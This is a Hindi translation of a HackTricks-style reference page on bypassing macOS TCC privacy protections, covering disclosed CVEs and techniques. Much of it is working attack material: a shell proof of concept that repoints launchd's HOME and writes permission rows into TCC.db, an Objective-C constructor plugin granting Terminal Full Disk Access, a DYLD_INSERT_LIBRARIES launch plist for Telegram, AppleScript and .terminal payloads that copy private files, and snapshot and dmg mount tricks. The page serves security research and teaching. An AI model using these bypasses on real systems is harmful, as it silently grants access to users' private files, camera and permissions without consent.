# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## कार्यक्षमता द्वारा

### लिखने का बायपास

यह एक बायपास नहीं है, यह बस TCC कैसे काम करता है: **यह लिखने से सुरक्षा नहीं करता**। यदि Terminal **को एक उपयोगकर्ता के डेस्कटॉप को पढ़ने की अनुमति नहीं है, तो यह अभी भी उसमें लिख सकता है**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
**विस्तारित विशेषता `com.apple.macl`** नए **फाइल** में जोड़ी जाती है ताकि **निर्माता ऐप** को इसे पढ़ने की अनुमति मिल सके।

### TCC ClickJacking

यह संभव है कि **TCC प्रॉम्प्ट के ऊपर एक विंडो डालें** ताकि उपयोगकर्ता इसे **स्वीकृत** कर सके बिना ध्यान दिए। आप [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)** में एक PoC पा सकते हैं।**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC अनुरोध किसी भी नाम से

हमलावर **किसी भी नाम के साथ ऐप्स बना सकता है** (जैसे Finder, Google Chrome...) **`Info.plist`** में और इसे कुछ TCC संरक्षित स्थानों तक पहुँचने के लिए अनुरोध करवा सकता है। उपयोगकर्ता सोचेगा कि वैध एप्लिकेशन ही इस पहुँच के लिए अनुरोध कर रहा है।\
इसके अलावा, यह संभव है कि **Dock से वैध ऐप को हटा दें और फर्जी ऐप को उस पर रखें**, ताकि जब उपयोगकर्ता फर्जी ऐप पर क्लिक करे (जो उसी आइकन का उपयोग कर सकता है) तो यह वैध ऐप को कॉल कर सके, TCC अनुमतियों के लिए पूछ सके और एक मैलवेयर निष्पादित कर सके, जिससे उपयोगकर्ता को विश्वास हो कि वैध ऐप ने पहुँच का अनुरोध किया।

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

अधिक जानकारी और PoC के लिए:

{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH बायपास

डिफ़ॉल्ट रूप से **SSH के माध्यम से पहुँच "पूर्ण डिस्क एक्सेस"** के साथ होती है। इसे अक्षम करने के लिए आपको इसे सूचीबद्ध करना होगा लेकिन अक्षम करना होगा (सूची से हटाने से उन विशेषाधिकारों को नहीं हटाया जाएगा):

![](<../../../../../images/image (1077).png>)

यहाँ आप देख सकते हैं कि कुछ **मैलवेयर ने इस सुरक्षा को बायपास करने में कैसे सक्षम हुए**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> ध्यान दें कि अब, SSH सक्षम करने के लिए आपको **पूर्ण डिस्क एक्सेस** की आवश्यकता है।

### हैंडल एक्सटेंशन - CVE-2022-26767

विशेषता **`com.apple.macl`** फाइलों को दी जाती है ताकि **किसी विशेष एप्लिकेशन को इसे पढ़ने की अनुमति मिल सके।** यह विशेषता तब सेट होती है जब **ड्रैग\&ड्रॉप** के माध्यम से एक फाइल को ऐप पर रखा जाता है, या जब उपयोगकर्ता **डबल-क्लिक** करता है एक फाइल को इसे **डिफ़ॉल्ट एप्लिकेशन** के साथ खोलने के लिए।

इसलिए, एक उपयोगकर्ता **एक दुर्भावनापूर्ण ऐप को पंजीकृत कर सकता है** ताकि सभी एक्सटेंशनों को संभाल सके और Launch Services को **खोलने** के लिए कॉल कर सके (ताकि दुर्भावनापूर्ण फाइल को इसे पढ़ने की अनुमति मिल सके)।

### iCloud

अधिकार **`com.apple.private.icloud-account-access`** के माध्यम से **`com.apple.iCloudHelper`** XPC सेवा के साथ संवाद करना संभव है जो **iCloud टोकन** प्रदान करेगा।

**iMovie** और **Garageband** के पास यह अधिकार था और अन्य जो अनुमति देते थे।

इस अधिकार से **icloud टोकन** प्राप्त करने के लिए शोषण के बारे में अधिक **जानकारी** के लिए देखें: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / ऑटोमेशन

एक ऐप जिसके पास **`kTCCServiceAppleEvents`** अनुमति है, वह **अन्य ऐप्स को नियंत्रित** कर सकेगा। इसका मतलब है कि यह **अन्य ऐप्स को दी गई अनुमतियों का दुरुपयोग** कर सकता है।

Apple Scripts के बारे में अधिक जानकारी के लिए देखें:

{{#ref}}
macos-apple-scripts.md
{{#endref}}

उदाहरण के लिए, यदि एक ऐप के पास **`iTerm`** पर ऑटोमेशन अनुमति है, तो इस उदाहरण में **`Terminal`** को iTerm पर पहुँच है:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### iTerm पर

Terminal, जिसे FDA नहीं है, iTerm को कॉल कर सकता है, जिसके पास यह है, और इसका उपयोग क्रियाएँ करने के लिए कर सकता है:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### ओवर फ़ाइंडर

या यदि किसी ऐप को फ़ाइंडर पर पहुंच है, तो यह एक स्क्रिप्ट हो सकती है जैसे कि यह:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## ऐप व्यवहार

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

यूजरलैंड **tccd डेमन** **`HOME`** **env** वेरिएबल का उपयोग करके TCC उपयोगकर्ताओं के डेटाबेस तक पहुँच रहा था: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[इस Stack Exchange पोस्ट](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) के अनुसार और क्योंकि TCC डेमन वर्तमान उपयोगकर्ता के डोमेन के भीतर `launchd` के माध्यम से चल रहा है, इसे पास किए गए **सभी वातावरण वेरिएबल्स** को **नियंत्रित** करना संभव है।\
इस प्रकार, एक **हमलावर `$HOME` वातावरण** वेरिएबल को **`launchctl`** में एक **नियंत्रित** **डायरेक्टरी** की ओर सेट कर सकता है, **TCC** डेमन को **रीस्टार्ट** कर सकता है, और फिर **TCC डेटाबेस को सीधे संशोधित** कर सकता है ताकि वह **हर उपलब्ध TCC अधिकार** प्राप्त कर सके बिना अंत उपयोगकर्ता को कभी भी संकेत दिए।\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - नोट्स

नोट्स को TCC संरक्षित स्थानों तक पहुंच थी लेकिन जब एक नोट बनाया जाता है तो यह **एक गैर-संरक्षित स्थान में बनाया जाता है**। इसलिए, आप नोट्स से एक संरक्षित फ़ाइल को एक नोट में कॉपी करने के लिए कह सकते हैं (तो एक गैर-संरक्षित स्थान में) और फिर फ़ाइल तक पहुंच सकते हैं:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - ट्रांसलोकेशन

बाइनरी `/usr/libexec/lsd` जिसमें लाइब्रेरी `libsecurity_translocate` थी, के पास `com.apple.private.nullfs_allow` का अधिकार था जिससे इसे **nullfs** माउंट बनाने की अनुमति मिली और इसके पास **`kTCCServiceSystemPolicyAllFiles`** के साथ `com.apple.private.tcc.allow` का अधिकार था जिससे हर फ़ाइल तक पहुंचने की अनुमति मिली।

"Library" पर क्वारंटाइन विशेषता जोड़ना संभव था, **`com.apple.security.translocation`** XPC सेवा को कॉल करना और फिर यह Library को **`$TMPDIR/AppTranslocation/d/d/Library`** पर मैप कर देगा जहां Library के अंदर सभी दस्तावेज़ों तक **पहुँच** की जा सकती थी।

### CVE-2023-38571 - म्यूजिक और टीवी <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** में एक दिलचस्प विशेषता है: जब यह चल रहा होता है, यह **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** में गिराए गए फ़ाइलों को उपयोगकर्ता की "मीडिया लाइब्रेरी" में **आयात** करेगा। इसके अलावा, यह कुछ इस तरह कॉल करता है: **`rename(a, b);`** जहां `a` और `b` हैं:

- `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
- `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3"`

यह **`rename(a, b);`** व्यवहार एक **रेस कंडीशन** के प्रति संवेदनशील है, क्योंकि यह संभव है कि `Automatically Add to Music.localized` फ़ोल्डर के अंदर एक नकली **TCC.db** फ़ाइल डाली जाए और फिर जब नया फ़ोल्डर(b) बनाया जाए तो फ़ाइल को कॉपी करें, उसे हटा दें, और इसे **`~/Library/Application Support/com.apple.TCC`** पर इंगित करें।

### SQLITE_SQLLOG_DIR - CVE-2023-32422

यदि **`SQLITE_SQLLOG_DIR="path/folder"`** है तो इसका मतलब है कि **कोई भी खुला db उस पथ पर कॉपी किया जाता है**। इस CVE में इस नियंत्रण का दुरुपयोग किया गया था ताकि **एक SQLite डेटाबेस के अंदर लिखा जा सके** जो **FDA TCC डेटाबेस के साथ एक प्रक्रिया द्वारा खोला जाएगा**, और फिर **`SQLITE_SQLLOG_DIR`** का दुरुपयोग **फाइलनाम में एक सिमलिंक** के साथ किया गया ताकि जब वह डेटाबेस **खुला** हो, उपयोगकर्ता **TCC.db को ओवरराइट** किया जा सके।\
**अधिक जानकारी** [**लेख में**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **और**[ **बातचीत में**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y&t=20548s)।

### **SQLITE_AUTO_TRACE**

यदि पर्यावरण चर **`SQLITE_AUTO_TRACE`** सेट किया गया है, तो लाइब्रेरी **`libsqlite3.dylib`** सभी SQL क्वेरीज़ को **लॉगिंग** करना शुरू कर देगी। कई अनुप्रयोगों ने इस लाइब्रेरी का उपयोग किया, इसलिए यह सभी SQLite क्वेरीज़ को लॉग करना संभव था।

कई Apple अनुप्रयोगों ने TCC संरक्षित जानकारी तक पहुंचने के लिए इस लाइब्रेरी का उपयोग किया।
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407

यह **env variable `Metal` framework द्वारा उपयोग किया जाता है** जो विभिन्न कार्यक्रमों पर निर्भरता है, विशेष रूप से `Music`, जिसमें FDA है।

निम्नलिखित सेट करें: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`। यदि `path` एक मान्य निर्देशिका है, तो बग ट्रिगर होगा और हम `fs_usage` का उपयोग करके देख सकते हैं कि कार्यक्रम में क्या हो रहा है:

- एक फ़ाइल `open()` की जाएगी, जिसका नाम `path/.dat.nosyncXXXX.XXXXXX` होगा (X यादृच्छिक है)
- एक या अधिक `write()` फ़ाइल में सामग्री लिखेंगे (हम इसका नियंत्रण नहीं करते)
- `path/.dat.nosyncXXXX.XXXXXX` को `path/name` में `renamed()` किया जाएगा

यह एक अस्थायी फ़ाइल लेखन है, इसके बाद एक **`rename(old, new)`** **जो सुरक्षित नहीं है।**

यह सुरक्षित नहीं है क्योंकि इसे **पुराने और नए पथों को अलग-अलग हल करना होगा**, जो कुछ समय ले सकता है और एक Race Condition के प्रति संवेदनशील हो सकता है। अधिक जानकारी के लिए आप `xnu` फ़ंक्शन `renameat_internal()` की जांच कर सकते हैं।

> [!CAUTION]
> तो, मूल रूप से, यदि एक विशेषाधिकार प्राप्त प्रक्रिया एक फ़ोल्डर से नाम बदल रही है जिसे आप नियंत्रित करते हैं, तो आप एक RCE जीत सकते हैं और इसे एक अलग फ़ाइल तक पहुँच बना सकते हैं या, जैसे कि इस CVE में, उस फ़ाइल को खोल सकते हैं जिसे विशेषाधिकार प्राप्त ऐप ने बनाया और एक FD संग्रहीत कर सकते हैं।
>
> यदि नाम बदलने का फ़ोल्डर आप नियंत्रित करते हैं, जबकि आपने स्रोत फ़ाइल को संशोधित किया है या इसके लिए एक FD है, तो आप गंतव्य फ़ाइल (या फ़ोल्डर) को एक symlink की ओर इंगित करने के लिए बदल सकते हैं, ताकि आप जब चाहें लिख सकें।

यह CVE में हमला था: उदाहरण के लिए, उपयोगकर्ता के `TCC.db` को ओवरराइट करने के लिए, हम कर सकते हैं:

- `/Users/hacker/ourlink` बनाएं जो `/Users/hacker/Library/Application Support/com.apple.TCC/` की ओर इंगित करता है
- निर्देशिका `/Users/hacker/tmp/` बनाएं
- सेट करें `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
- इस env var के साथ `Music` चलाकर बग को ट्रिगर करें
- `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` का `open()` पकड़ें (X यादृच्छिक है)
- यहाँ हम इस फ़ाइल को लेखन के लिए भी `open()` करते हैं, और फ़ाइल डिस्क्रिप्टर को पकड़ कर रखते हैं
- `/Users/hacker/tmp` को `/Users/hacker/ourlink` के साथ **एक लूप में** परमाणु रूप से स्विच करें
- हम ऐसा करते हैं ताकि हमारी सफल होने की संभावनाएँ अधिकतम हो सकें क्योंकि रेस विंडो काफी संकीर्ण है, लेकिन रेस हारने का नुकसान नगण्य है
- थोड़ा इंतजार करें
- जांचें कि क्या हमें भाग्यशाली मिला
- यदि नहीं, तो फिर से शीर्ष से चलाएं

अधिक जानकारी के लिए [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

> [!CAUTION]
> अब, यदि आप env variable `MTL_DUMP_PIPELINES_TO_JSON_FILE` का उपयोग करने की कोशिश करते हैं, तो ऐप्स लॉन्च नहीं होंगे

### Apple Remote Desktop

रूट के रूप में आप इस सेवा को सक्षम कर सकते हैं और **ARD एजेंट को पूर्ण डिस्क एक्सेस** होगा जिसे फिर एक उपयोगकर्ता द्वारा एक नए **TCC उपयोगकर्ता डेटाबेस** की कॉपी करने के लिए दुरुपयोग किया जा सकता है।

## By **NFSHomeDirectory**

TCC उपयोगकर्ता के HOME फ़ोल्डर में एक डेटाबेस का उपयोग करता है ताकि उपयोगकर्ता के लिए विशिष्ट संसाधनों तक पहुँच को नियंत्रित किया जा सके **$HOME/Library/Application Support/com.apple.TCC/TCC.db**।\
इसलिए, यदि उपयोगकर्ता $HOME env variable को एक **विभिन्न फ़ोल्डर** की ओर इंगित करने के लिए TCC को पुनरारंभ करने में सफल होता है, तो उपयोगकर्ता **/Library/Application Support/com.apple.TCC/TCC.db** में एक नया TCC डेटाबेस बना सकता है और TCC को किसी भी ऐप को कोई भी TCC अनुमति देने के लिए धोखा दे सकता है।

> [!TIP]
> ध्यान दें कि Apple उपयोगकर्ता के प्रोफ़ाइल में **`NFSHomeDirectory`** विशेषता में संग्रहीत सेटिंग का उपयोग करता है **`$HOME`** के मान के लिए, इसलिए यदि आप इस मान को संशोधित करने के लिए अनुमतियों के साथ एक एप्लिकेशन से समझौता करते हैं (**`kTCCServiceSystemPolicySysAdminFiles`**), तो आप इस विकल्प को TCC बायपास के साथ **हथियारबंद** कर सकते हैं।

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**पहला POC** [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) और [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) का उपयोग करता है ताकि उपयोगकर्ता के **HOME** फ़ोल्डर को संशोधित किया जा सके।

1. लक्षित ऐप के लिए एक _csreq_ ब्लॉब प्राप्त करें।
2. आवश्यक पहुँच और _csreq_ ब्लॉब के साथ एक नकली _TCC.db_ फ़ाइल लगाएं।
3. [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) के साथ उपयोगकर्ता की Directory Services प्रविष्टि को निर्यात करें।
4. उपयोगकर्ता के होम डायरेक्टरी को बदलने के लिए Directory Services प्रविष्टि को संशोधित करें।
5. [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) के साथ संशोधित Directory Services प्रविष्टि को आयात करें।
6. उपयोगकर्ता के _tccd_ को रोकें और प्रक्रिया को पुनरारंभ करें।

दूसरे POC ने **`/usr/libexec/configd`** का उपयोग किया जिसमें `com.apple.private.tcc.allow` था जिसका मान `kTCCServiceSystemPolicySysAdminFiles` था।\
यह संभव था **`configd`** को **`-t`** विकल्प के साथ चलाने के लिए, एक हमलावर एक **कस्टम बंडल लोड करने** के लिए निर्दिष्ट कर सकता था। इसलिए, यह शोषण **उपयोगकर्ता के होम डायरेक्टरी को बदलने के लिए** **`dsexport`** और **`dsimport`** विधि को **`configd` कोड इंजेक्शन** के साथ **बदलता** है।

अधिक जानकारी के लिए [**मूल रिपोर्ट**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/) देखें।

## By process injection

कोई प्रक्रिया के अंदर कोड इंजेक्ट करने और इसके TCC विशेषाधिकारों का दुरुपयोग करने के लिए विभिन्न तकनीकें हैं:

{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

इसके अलावा, TCC को बायपास करने के लिए सबसे सामान्य प्रक्रिया इंजेक्शन **प्लगइन्स (लोड लाइब्रेरी)** के माध्यम से पाया गया है।\
प्लगइन्स अतिरिक्त कोड होते हैं जो आमतौर पर लाइब्रेरी या plist के रूप में होते हैं, जिन्हें **मुख्य एप्लिकेशन द्वारा लोड किया जाएगा** और इसके संदर्भ में निष्पादित किया जाएगा। इसलिए, यदि मुख्य एप्लिकेशन को TCC प्रतिबंधित फ़ाइलों तक पहुँच प्राप्त है (अनुमतियों या अधिकारों के माध्यम से), तो **कस्टम कोड को भी यह प्राप्त होगा**।

### CVE-2020-27937 - Directory Utility

एप्लिकेशन `/System/Library/CoreServices/Applications/Directory Utility.app` में विशेषाधिकार **`kTCCServiceSystemPolicySysAdminFiles`** था, लोड किए गए प्लगइन्स के साथ **`.daplug`** एक्सटेंशन और **सुरक्षित** रनटाइम नहीं था।

इस CVE को हथियारबंद करने के लिए, **`NFSHomeDirectory`** को **बदल दिया गया** (पिछले विशेषाधिकार का दुरुपयोग करते हुए) ताकि उपयोगकर्ता के TCC डेटाबेस को **कब्जा** किया जा सके और TCC को बायपास किया जा सके।

अधिक जानकारी के लिए [**मूल रिपोर्ट**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/) देखें।

### CVE-2020-29621 - Coreaudiod

बाइनरी **`/usr/sbin/coreaudiod`** में विशेषाधिकार `com.apple.security.cs.disable-library-validation` और `com.apple.private.tcc.manager` थे। पहला **कोड इंजेक्शन** की अनुमति देता है और दूसरा इसे **TCC प्रबंधित** करने की अनुमति देता है।

इस बाइनरी ने **तीसरे पक्ष के प्लगइन्स** को फ़ोल्डर `/Library/Audio/Plug-Ins/HAL` से लोड करने की अनुमति दी। इसलिए, यह संभव था कि **एक प्लगइन लोड करें और इस PoC के साथ TCC अनुमतियों का दुरुपयोग करें:**
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
For more info check the [**original report**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Device Abstraction Layer (DAL) Plug-Ins

सिस्टम एप्लिकेशन जो Core Media I/O के माध्यम से कैमरा स्ट्रीम खोलते हैं (**`kTCCServiceCamera`** के साथ ऐप्स) **इन प्लग-इन्स को लोड करते हैं** जो `/Library/CoreMediaIO/Plug-Ins/DAL` में स्थित हैं (SIP प्रतिबंधित नहीं)।

वहाँ एक सामान्य **कंस्ट्रक्टर** के साथ एक लाइब्रेरी को स्टोर करना **कोड इंजेक्ट** करने के लिए काम करेगा।

कई Apple एप्लिकेशन इस पर कमजोर थे।

### Firefox

Firefox एप्लिकेशन में `com.apple.security.cs.disable-library-validation` और `com.apple.security.cs.allow-dyld-environment-variables` अधिकार थे:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
अधिक जानकारी के लिए कि इसे आसानी से कैसे शोषण करें [**मूल रिपोर्ट देखें**](https://wojciechregula.blog/post/how-to-rob-a-firefox/)।

### CVE-2020-10006

बाइनरी `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` में **`com.apple.private.tcc.allow`** और **`com.apple.security.get-task-allow`** अधिकार थे, जिसने प्रक्रिया के अंदर कोड इंजेक्ट करने और TCC विशेषाधिकारों का उपयोग करने की अनुमति दी।

### CVE-2023-26818 - Telegram

Telegram में **`com.apple.security.cs.allow-dyld-environment-variables`** और **`com.apple.security.cs.disable-library-validation`** अधिकार थे, इसलिए इसे **इसके अनुमतियों तक पहुंच प्राप्त करने** के लिए दुरुपयोग करना संभव था, जैसे कैमरे के साथ रिकॉर्डिंग करना। आप [**लिखाई में पेलोड ढूंढ सकते हैं**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)।

ध्यान दें कि एक लाइब्रेरी लोड करने के लिए env वेरिएबल का उपयोग कैसे करें, एक **कस्टम plist** बनाई गई थी ताकि इस लाइब्रेरी को इंजेक्ट किया जा सके और **`launchctl`** का उपयोग इसे लॉन्च करने के लिए किया गया:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## खुली आमंत्रणों द्वारा

यह संभव है कि **`open`** को सैंडबॉक्स में रहते हुए भी आमंत्रित किया जा सके

### टर्मिनल स्क्रिप्ट्स

यह तकनीकी लोगों द्वारा उपयोग किए जाने वाले कंप्यूटरों में टर्मिनल को **पूर्ण डिस्क एक्सेस (FDA)** देना आम है। और इसके साथ **`.terminal`** स्क्रिप्ट्स को आमंत्रित करना संभव है।

**`.terminal`** स्क्रिप्ट्स plist फ़ाइलें हैं जैसे कि यह एक जिसमें **`CommandString`** कुंजी में निष्पादित करने के लिए आदेश होता है:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
एक एप्लिकेशन एक टर्मिनल स्क्रिप्ट को /tmp जैसी जगह पर लिख सकता है और इसे इस तरह से लॉन्च कर सकता है:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## By mounting

### CVE-2020-9771 - mount_apfs TCC बायपास और विशेषाधिकार वृद्धि

**कोई भी उपयोगकर्ता** (यहां तक कि बिना विशेषाधिकार वाले) एक टाइम मशीन स्नैपशॉट बना और माउंट कर सकता है और उस स्नैपशॉट के **सभी फ़ाइलों** तक पहुंच सकता है।\
आवश्यक **केवल विशेषाधिकार** यह है कि उपयोग किए जाने वाले एप्लिकेशन (जैसे `Terminal`) को **पूर्ण डिस्क एक्सेस** (FDA) एक्सेस (`kTCCServiceSystemPolicyAllfiles`) होना चाहिए, जिसे एक व्यवस्थापक द्वारा प्रदान किया जाना चाहिए।
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
एक अधिक विस्तृत व्याख्या [**मूल रिपोर्ट में**](https://theevilbit.github.io/posts/cve_2020_9771/)** पाई जा सकती है।**

### CVE-2021-1784 & CVE-2021-30808 - TCC फ़ाइल पर माउंट करें

यहां तक कि अगर TCC DB फ़ाइल सुरक्षित है, तो एक नया TCC.db फ़ाइल **निर्देशिका पर माउंट करना** संभव था:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
चेक करें **पूर्ण एक्सप्लॉइट** [**मूल लेख**](https://theevilbit.github.io/posts/cve-2021-30808/) में।

### CVE-2024-40855

जैसा कि [मूल लेख](https://www.kandji.io/blog/macos-audit-story-part2) में समझाया गया है, इस CVE ने `diskarbitrationd` का दुरुपयोग किया।

सार्वजनिक `DiskArbitration` फ्रेमवर्क से `DADiskMountWithArgumentsCommon` फ़ंक्शन सुरक्षा जांचें करता है। हालाँकि, इसे बायपास करना संभव है `diskarbitrationd` को सीधे कॉल करके और इसलिए पथ में `../` तत्वों और सिमलिंक्स का उपयोग करके।

